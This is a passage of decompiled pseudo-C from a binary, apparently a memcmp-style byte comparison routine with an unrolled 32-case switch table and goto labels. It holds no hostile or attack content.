(iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x1a);\n                uVar2 = *(arg_ch + 0x1a);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 0x1b) - *(arg_ch + 0x1b);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            if (arg_8h[7] == arg_ch[7]) {\n                iVar5 = 0;\n            }\n            else {\n                uVar4 = arg_8h[7] & 0xff;\n                uVar2 = *(arg_ch + 7);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x1d);\n                uVar2 = *(arg_ch + 0x1d);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                uVar4 = *(arg_8h + 0x1e);\n                uVar2 = *(arg_ch + 0x1e);\n                if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                    return iVar5;\n                }\n                iVar5 = *(arg_8h + 0x1f) - *(arg_ch + 0x1f);\n                if (iVar5 != 0) {\n                    iVar5 = (0 < iVar5) * 2 + -1;\n                }\n            }\n            if (iVar5 != 0) {\n                return iVar5;\n            }\n            arg_10h = arg_10h - 0x20;\n            arg_8h = arg_8h + 8;\n            arg_ch = arg_ch + 8;\n        } while (0x1f < arg_10h);\n    }\n    // switch table (32 cases) at 0x418a6c\n    switch(arg_10h) {\n    case 1:\n        goto code_r0x00418106;\n    case 2:\n        goto code_r0x00418581;\n    case 3:\n        goto code_r0x00418a1d;\n    case 4:\n        goto code_r0x00417c3f;\n    case 5:\n        goto code_r0x00418080;\n    case 6:\n        goto code_r0x004184e2;\n    case 7:\n        goto code_r0x0041898e;\n    case 8:\n        goto code_r0x00417ba0;\n    case 9:\n        goto code_r0x00417fe1;\n    case 10:\n        goto code_r0x00418443;\n    case 0xb:\n        goto code_r0x004188ef;\n    case 0xc:\n        goto code_r0x00417b01;\n    case 0xd:\n        goto code_r0x00417f42;\n    case 0xe:\n        goto code_r0x004183a4;\n    case 0xf:\n        goto code_r0x00418850;\n    case 0x10:\n        goto code_r0x00417a62;\n    case 0x11:\n        goto code_r0x00417ea3;\n    case 0x12:\n        goto code_r0x00418305;\n    case 0x13:\n        goto code_r0x004187b1;\n    case 0x14:\n        goto code_r0x004179c3;\n    case 0x15:\n        goto code_r0x00417e04;\n    case 0x16:\n        goto code_r0x00418266;\n    case 0x17:\n        goto code_r0x00418712;\n    case 0x1c:\n        if (*(arg_8h + (arg_10h - 0x1c)) == *(arg_ch + (arg_10h - 0x1c))) {\n            iVar5 = 0;\n        }\n        else {\n            uVar2 = *(arg_ch + (arg_10h - 0x1c));\n            uVar4 = *(arg_8h + (arg_10h - 0x1c));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1b));\n            uVar2 = *(arg_ch + (arg_10h - 0x1b));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1a));\n            uVar2 = *(arg_ch + (arg_10h - 0x1a));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            iVar5 = *(arg_8h + (arg_10h - 0x19)) - *(arg_ch + (arg_10h - 0x19));\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n    case 0x18:\n        uVar2 = *(arg_8h + (arg_10h - 0x18));\n        if (uVar2 == *(arg_ch + (arg_10h - 0x18))) {\n            iVar5 = 0;\n        }\n        else {\n            uVar2 = uVar2 & 0xff;\n            uVar4 = *(arg_ch + (arg_10h - 0x18));\n            if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x17));\n            uVar2 = *(arg_ch + (arg_10h - 0x17));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x16));\n            uVar2 = *(arg_ch + (arg_10h - 0x16));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            iVar5 = *(arg_8h + (arg_10h - 0x15)) - *(arg_ch + (arg_10h - 0x15));\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        goto code_r0x004179c3;\n    case 0x1d:\n        uVar2 = *(arg_8h + (arg_10h - 0x1d));\n        if (uVar2 == *(arg_ch + (arg_10h - 0x1d))) {\n            iVar5 = 0;\n        }\n        else {\n            uVar2 = uVar2 & 0xff;\n            uVar4 = *(arg_ch + (arg_10h - 0x1d));\n            if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1c));\n            uVar2 = *(arg_ch + (arg_10h - 0x1c));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1b));\n            uVar2 = *(arg_ch + (arg_10h - 0x1b));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            iVar5 = *(arg_8h + (arg_10h - 0x1a)) - *(arg_ch + (arg_10h - 0x1a));\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n    case 0x19:\n        if (*(arg_8h + (arg_10h - 0x19)) == *(arg_ch + (arg_10h - 0x19))) {\n            iVar5 = 0;\n        }\n        else {\n            uVar2 = *(arg_ch + (arg_10h - 0x19));\n            uVar4 = *(arg_8h + (arg_10h - 0x19));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x18));\n            uVar2 = *(arg_ch + (arg_10h - 0x18));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x17));\n            uVar2 = *(arg_ch + (arg_10h - 0x17));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            iVar5 = *(arg_8h + (arg_10h - 0x16)) - *(arg_ch + (arg_10h - 0x16));\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        goto code_r0x00417e04;\n    case 0x1e:\n        uVar2 = *(arg_8h + (arg_10h - 0x1e));\n        if (uVar2 == *(arg_ch + (arg_10h - 0x1e))) {\n            iVar3 = 0;\n        }\n        else {\n            uVar2 = uVar2 & 0xff;\n            uVar4 = *(arg_ch + (arg_10h - 0x1e));\n            if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n                return iVar3;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1d));\n            uVar2 = *(arg_ch + (arg_10h - 0x1d));\n            if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                return iVar3;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1c));\n            uVar2 = *(arg_ch + (arg_10h - 0x1c));\n            if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                return iVar3;\n            }\n            iVar3 = *(arg_8h + (arg_10h - 0x1b)) - *(arg_ch + (arg_10h - 0x1b));\n            if (iVar3 != 0) {\n                iVar3 = (0 < iVar3) * 2 + -1;\n            }\n        }\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    case 0x1a:\n        if (*(arg_8h + (arg_10h - 0x1a)) == *(arg_ch + (arg_10h - 0x1a))) {\n            iVar3 = 0;\n        }\n        else {\n            uVar2 = *(arg_ch + (arg_10h - 0x1a));\n            uVar4 = *(arg_8h + (arg_10h - 0x1a));\n            if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                return iVar3;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x19));\n            uVar2 = *(arg_ch + (arg_10h - 0x19));\n            if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                return iVar3;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x18));\n            uVar2 = *(arg_ch + (arg_10h - 0x18));\n            if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                return iVar3;\n            }\n            iVar3 = *(arg_8h + (arg_10h - 0x17)) - *(arg_ch + (arg_10h - 0x17));\n            if (iVar3 != 0) {\n                iVar3 = (0 < iVar3) * 2 + -1;\n            }\n        }\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n        goto code_r0x00418266;\n    case 0x1f:\n        if (*(arg_8h + (arg_10h - 0x1f)) == *(arg_ch + (arg_10h - 0x1f))) {\n            iVar5 = 0;\n        }\n        else {\n            uVar2 = *(arg_ch + (arg_10h - 0x1f));\n            uVar4 = *(arg_8h + (arg_10h - 0x1f));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1e));\n            uVar2 = *(arg_ch + (arg_10h - 0x1e));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1d));\n            uVar2 = *(arg_ch + (arg_10h - 0x1d));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            iVar5 = *(arg_8h + (arg_10h - 0x1c)) - *(arg_ch + (arg_10h - 0x1c));\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n    case 0x1b:\n        uVar2 = *(arg_8h + (arg_10h - 0x1b));\n        if (uVar2 == *(arg_ch + (arg_10h - 0x1b))) {\n            iVar5 = 0;\n        }\n        else {\n            uVar2 = uVar2 & 0xff;\n            uVar4 = *(arg_ch + (arg_10h - 0x1b));\n            if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1a));\n            uVar2 = *(arg_ch + (arg_10h - 0x1a));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x19));\n            uVar2 = *(arg_ch + (arg_10h - 0x19));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            iVar5 = *(arg_8h + (arg_10h - 0x18)) - *(arg_ch + (arg_10h - 0x18));\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        goto code_r0x00418712;\n    }\n    goto code_r0x00417cce;\ncode_r0x00418712:\n    uVar2 = *(arg_8h + (arg_10h - 0x17));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x17))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x17));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x16));\n        uVar2 = *(arg_ch + (arg_10h - 0x16));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x15));\n        uVar2 = *(arg_ch + (arg_10h - 0x15));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 0x14)) - *(arg_ch + (arg_10h - 0x14));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x004187b1;\ncode_r0x00418266:\n    uVar2 = *(arg_8h + (arg_10h - 0x16));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x16))) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x16));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x15));\n        uVar2 = *(arg_ch + (arg_10h - 0x15));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x14));\n        uVar2 = *(arg_ch + (arg_10h - 0x14));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 0x13)) - *(arg_ch + (arg_10h - 0x13));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    goto code_r0x00418305;\ncode_r0x00417e04:\n    uVar2 = *(arg_8h + (arg_10h - 0x15));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x15))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x15));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x14));\n        uVar2 = *(arg_ch + (arg_10h - 0x14));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x13));\n        uVar2 = *(arg_ch + (arg_10h - 0x13));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 0x12)) - *(arg_ch + (arg_10h - 0x12));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00417ea3;\ncode_r0x004179c3:\n    uVar2 = *(arg_8h + (arg_10h - 0x14));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x14))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x14));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x13));\n        uVar2 = *(arg_ch + (arg_10h - 0x13));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x12));\n        uVar2 = *(arg_ch + (arg_10h - 0x12));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 0x11)) - *(arg_ch + (arg_10h - 0x11));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00417a62;\ncode_r0x004187b1:\n    uVar2 = *(arg_8h + (arg_10h - 0x13));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x13))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x13));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x12));\n        uVar2 = *(arg_ch + (arg_10h - 0x12));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x11));\n        uVar2 = *(arg_ch + (arg_10h - 0x11));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 0x10)) - *(arg_ch + (arg_10h - 0x10));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00418850;\ncode_r0x00418305:\n    uVar2 = *(arg_8h + (arg_10h - 0x12));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x12))) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x12));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x11));\n        uVar2 = *(arg_ch + (arg_10h - 0x11));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x10));\n        uVar2 = *(arg_ch + (arg_10h - 0x10));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 0xf)) - *(arg_ch + (arg_10h - 0xf));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    goto code_r0x004183a4;\ncode_r0x00417ea3:\n    uVar2 = *(arg_8h + (arg_10h - 0x11));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x11))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x11));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x10));\n        uVar2 = *(arg_ch + (arg_10h - 0x10));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xf));\n        uVar2 = *(arg_ch + (arg_10h - 0xf));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 0xe)) - *(arg_ch + (arg_10h - 0xe));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00417f42;\ncode_r0x00417a62:\n    uVar2 = *(arg_8h + (arg_10h - 0x10));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x10))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x10));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xf));\n        uVar2 = *(arg_ch + (arg_10h - 0xf));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xe));\n        uVar2 = *(arg_ch + (arg_10h - 0xe));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 0xd)) - *(arg_ch + (arg_10h - 0xd));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00417b01;\ncode_r0x00418850:\n    uVar2 = *(arg_8h + (arg_10h - 0xf));\n    if (uVar2 == *(arg_ch + (arg_10h - 0xf))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0xf));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xe));\n        uVar2 = *(arg_ch + (arg_10h - 0xe));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xd));\n        uVar2 = *(arg_ch + (arg_10h - 0xd));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 0xc)) - *(arg_ch + (arg_10h - 0xc));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x004188ef;\ncode_r0x004183a4:\n    uVar2 = *(arg_8h + (arg_10h - 0xe));\n    if (uVar2 == *(arg_ch + (arg_10h - 0xe))) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0xe));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xd));\n        uVar2 = *(arg_ch + (arg_10h - 0xd));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xc));\n        uVar2 = *(arg_ch + (arg_10h - 0xc));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 0xb)) - *(arg_ch + (arg_10h - 0xb));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    goto code_r0x00418443;\ncode_r0x00417f42:\n    uVar2 = *(arg_8h + (arg_10h - 0xd));\n    if (uVar2 == *(arg_ch + (arg_10h - 0xd))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0xd));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xc));\n        uVar2 = *(arg_ch + (arg_10h - 0xc));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xb));\n        uVar2 = *(arg_ch + (arg_10h - 0xb));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 10)) - *(arg_ch + (arg_10h - 10));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00417fe1;\ncode_r0x00417b01:\n    uVar2 = *(arg_8h + (arg_10h - 0xc));\n    if (uVar2 == *(arg_ch + (arg_10h - 0xc))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0xc));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xb));\n        uVar2 = *(arg_ch + (arg_10h - 0xb));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 10));\n        uVar2 = *(arg_ch + (arg_10h - 10));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 9)) - *(arg_ch + (arg_10h - 9));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00417ba0;\ncode_r0x004188ef:\n    uVar2 = *(arg_8h + (arg_10h - 0xb));\n    if (uVar2 == *(arg_ch + (arg_10h - 0xb))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0xb));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 10));\n        uVar2 = *(arg_ch + (arg_10h - 10));\n        if ((uVar4 != 